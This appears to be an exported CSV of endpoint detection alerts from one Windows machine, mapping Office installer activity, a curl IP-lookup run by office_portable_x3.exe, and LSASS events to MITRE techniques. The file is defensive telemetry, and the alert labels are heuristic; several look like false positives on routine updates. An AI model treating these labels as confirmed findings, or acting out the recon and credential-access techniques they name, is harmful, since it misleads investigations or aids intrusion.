Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:21:18.032",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Startup Maintenance"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Startup Maintenance.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"22,372",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-3F644C76
"Jun 1, 2026 @ 14:21:17.312",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Feature Updates"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Feature Updates.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"30,448",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-D4F26863
"Jun 1, 2026 @ 14:21:17.212",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Feature Updates"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Feature Updates.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"30,448",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-EBA7AC17
"Jun 1, 2026 @ 14:21:17.497",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Feature Updates Logon"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Feature Updates Logon.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"20,308",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-FE8B6216
"Jun 1, 2026 @ 14:21:17.403",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Feature Updates Logon"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Feature Updates Logon.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"20,308",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-5B6FB890
"Jun 1, 2026 @ 14:23:20.048",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 103.243.115.105 ; Unusual process accessing LSASS memory,173.10.254.170,103.243.115.105,,,,disconnect_received,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-E95CEC62
"Jun 1, 2026 @ 14:23:20.035",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 103.243.115.105 ; Unusual process accessing LSASS memory,173.10.254.170,103.243.115.105,,,,connection_attempted,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-F62F6AD2
"Jun 1, 2026 @ 14:23:20.090",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 23.37.85.99 ; Unusual process accessing LSASS memory,173.10.254.170,23.37.85.99,,,,connection_attempted,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-72877E7A
"Jun 1, 2026 @ 14:23:20.181",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 104.18.20.213 ; Unusual process accessing LSASS memory,173.10.254.170,104.18.20.213,,,,connection_attempted,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-DA8D6BE4
"Jun 1, 2026 @ 14:23:20.786",C:\Windows\System32\curl.exe,C:\Users\DELL\office_portable_x3.exe,curl -s --max-time 10 https://ipinfo.io/country,LOLBin Abuse | Recon / IP Discovery,55,Living-off-the-land binary: curl.exe ; Recon tool query: curl -s --max-time 10 https://ipinfo.io/country,,,,,,end,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-F87AF2D7
"Jun 1, 2026 @ 14:23:19.773",C:\Windows\System32\curl.exe,,,LOLBin Abuse | Recon / IP Discovery,55,Living-off-the-land binary: curl.exe ; Recon DNS query: ipinfo.io,,,,,ipinfo.io,lookup_result,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-41EEFF19
"Jun 1, 2026 @ 14:23:19.753",C:\Windows\System32\curl.exe,,,LOLBin Abuse | Recon / IP Discovery,55,Living-off-the-land binary: curl.exe ; Recon DNS query: ipinfo.io,,,,,ipinfo.io,lookup_requested,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-1CE9E09F
"Jun 1, 2026 @ 14:23:19.684",C:\Windows\System32\curl.exe,C:\Users\DELL\office_portable_x3.exe,curl -s --max-time 10 https://ipinfo.io/country,LOLBin Abuse | Recon / IP Discovery,55,Living-off-the-land binary: curl.exe ; Recon tool query: curl -s --max-time 10 https://ipinfo.io/country,,,,,,start,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-50EEF7A3
"Jun 1, 2026 @ 14:21:42.918",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\CMP71.tmp,,creation,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-63A6B420
"Jun 1, 2026 @ 14:21:41.269",C:\Windows\SysWOW64\msiexec.exe,C:\Windows\System32\msiexec.exe,c:\Windows\syswow64\MsiExec.exe -Embedding F3E2DB8F4304A6E67BD72B7063113D52 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"22,992",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-3BAFE7F2
"Jun 1, 2026 @ 14:23:19.774",C:\Windows\System32\curl.exe,,,LOLBin Abuse,50,Living-off-the-land binary: curl.exe,127.0.0.1,127.0.0.1,,,,disconnect_received,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-F9F97D76
"Jun 1, 2026 @ 14:23:15.317",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-309A65F9
"Jun 1, 2026 @ 14:21:38.098",C:\Windows\SysWOW64\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\syswow64\MsiExec.exe -Embedding 189C0A08651FD6F8AF60DDA3DCD42393 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"37,284",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-364541E1
"Jun 1, 2026 @ 14:21:39.510",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\CMPF322.tmp,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-91049CC4
"Jun 1, 2026 @ 14:21:40.968",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\CMPF8D0.tmp,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-1B422589
"Jun 1, 2026 @ 14:21:41.675",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,c:\Windows\System32\MsiExec.exe -Embedding 17B454BD89D4606AD8583AC7E96BFAA3 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"25,464",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-B1DD9025
"Jun 1, 2026 @ 14:21:43.246",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFF2C6E40CCAD2504D.TMP,,creation,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-675005A4
"Jun 1, 2026 @ 14:21:41.000",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\System32\MsiExec.exe -Embedding 0F11E21D2A1C2C53A06BA3DAFA972429 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"12,192",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-53835A8A
"Jun 1, 2026 @ 14:23:12.342",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_nqu2ntqj.lvi.psm1,,creation,"2,204",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-007F7F6D
"Jun 1, 2026 @ 14:23:10.834",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_qc1sd1u2.15i.psm1,,creation,"6,972",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-FB5C24DF
"Jun 1, 2026 @ 14:21:44.259",C:\Windows\SysWOW64\msiexec.exe,C:\Windows\System32\msiexec.exe,c:\Windows\syswow64\MsiExec.exe -Embedding F3E2DB8F4304A6E67BD72B7063113D52 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"22,992",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-FE4641AB
"Jun 1, 2026 @ 14:23:11.847",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-469341AA
"Jun 1, 2026 @ 14:23:12.339",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_nbmrvwln.k5p.ps1,,creation,"2,204",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-65881A73
"Jun 1, 2026 @ 14:21:44.260",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,c:\Windows\System32\MsiExec.exe -Embedding 17B454BD89D4606AD8583AC7E96BFAA3 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"25,464",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-A973EF64
"Jun 1, 2026 @ 14:21:41.008",C:\Windows\SysWOW64\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\syswow64\MsiExec.exe -Embedding 189C0A08651FD6F8AF60DDA3DCD42393 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"37,284",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-03E12AB4
"Jun 1, 2026 @ 14:21:43.245",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF2710CA8D7EE71E47.TMP,,creation,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-2ADC4E91
"Jun 1, 2026 @ 14:21:44.241",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFE7A759CD128CD015.TMP,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-6CE0489F
"Jun 1, 2026 @ 14:21:44.232",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\CMP591.tmp,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-53F8EA0C
"Jun 1, 2026 @ 14:23:19.748",C:\Windows\System32\curl.exe,,,LOLBin Abuse,50,Living-off-the-land binary: curl.exe,127.0.0.1,127.0.0.1,,,,connection_accepted,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-6D1291D3
"Jun 1, 2026 @ 14:21:39.509",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFA6CF58F909D171E0.TMP,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-C31E8F74
"Jun 1, 2026 @ 14:23:13.169",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-5BAB9DCF
"Jun 1, 2026 @ 14:21:38.539",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\System32\MsiExec.exe -Embedding 0F11E21D2A1C2C53A06BA3DAFA972429 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"12,192",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-EA0310D2
"Jun 1, 2026 @ 14:23:14.247",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-5ED0B297
"Jun 1, 2026 @ 14:23:15.645",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_0ucesdw0.nn3.psm1,,creation,"11,540",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-E0AFE489
"Jun 1, 2026 @ 14:24:03.157",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,50,Living-off-the-land binary: wscript.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1002\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,,,modification,"33,896",T1059.005,Visual Basic,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-E0E4288A
"Jun 1, 2026 @ 14:24:03.156",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,50,Living-off-the-land binary: wscript.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1002\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"33,896",T1059.005,Visual Basic,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-B467142E
"Jun 1, 2026 @ 14:21:39.508",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFE03EA4ADE8ABB554.TMP,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-01D8392A
"Jun 1, 2026 @ 14:23:15.642",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_cwxcdz2s.bj5.ps1,,creation,"11,540",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-AA996E20
"Jun 1, 2026 @ 14:23:16.472",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-22B4B5B4
"Jun 1, 2026 @ 14:23:58.890",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-799B852B
"Jun 1, 2026 @ 14:23:20.080",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,x1.c.lencr.org,lookup_result,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-D1FF4094
"Jun 1, 2026 @ 14:23:58.406",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,45,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_A7BRHFHZBWH4EDA4C7DUA7HKEEAABQHJ.R,,rename,"25,556",,,False,MEDIUM,MEDIUM,Needs Review,Review,Review process network history; identify C2 pattern,AH-9665ED45
"Jun 1, 2026 @ 14:23:58.421",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,45,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_DNE4CFAVASBNGQGKBJG5H7G2GBCNDPAJ.R,,creation,"25,556",,,False,MEDIUM,MEDIUM,Needs Review,Review,Review process network history; identify C2 pattern,AH-FF8EE7AA
"Jun 1, 2026 @ 14:23:37.003",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-033A82F3
"Jun 1, 2026 @ 14:23:37.022",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-A2427871
"Jun 1, 2026 @ 14:23:20.066",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,x1.c.lencr.org,lookup_requested,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-EBE7BABB
"Jun 1, 2026 @ 14:23:58.528",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-3DEC82ED
"Jun 1, 2026 @ 14:23:58.413",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,45,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_H6GZFSHPCNBKBACEBUGJFFFUDXCSHZD7.R,,creation,"25,556",,,False,MEDIUM,MEDIUM,Needs Review,Review,Review process network history; identify C2 pattern,AH-D99F266E
"Jun 1, 2026 @ 14:23:36.386",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-5C567604
"Jun 1, 2026 @ 14:23:20.157",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,r12.c.lencr.org,lookup_requested,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-8FB5CB0E
"Jun 1, 2026 @ 14:23:36.367",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-56B970D1
"Jun 1, 2026 @ 14:23:20.172",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,r12.c.lencr.org,lookup_result,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-C977B647
"Jun 1, 2026 @ 14:23:41.030",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-61F3B6B9
"Jun 1, 2026 @ 14:23:40.941",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-4B4761F2
"Jun 1, 2026 @ 14:21:18.168",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\orgchart.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\orgchart.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-E369DF94
"Jun 1, 2026 @ 14:21:18.248",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\scanpst.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\scanpst.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-4C27EDD1
"Jun 1, 2026 @ 14:22:58.474",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,External Communication | LOLBin Abuse,40,Living-off-the-land binary: powershell.exe ; Outbound to external IP: 217.160.0.149,173.10.254.170,217.160.0.149,,,,disconnect_received,"1,860",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Block destination IP at perimeter; review netflow,AH-B0A732D9
"Jun 1, 2026 @ 14:21:18.171",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msosrec.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msosrec.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-7B4669D8
"Jun 1, 2026 @ 14:21:18.169",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\powerpnt.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powerpnt.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-D1010419
"Jun 1, 2026 @ 14:21:17.516",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msoadfsb.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msoadfsb.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-E33E6B06
"Jun 1, 2026 @ 14:21:17.511",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msoasb.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msoasb.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-A2A667CC
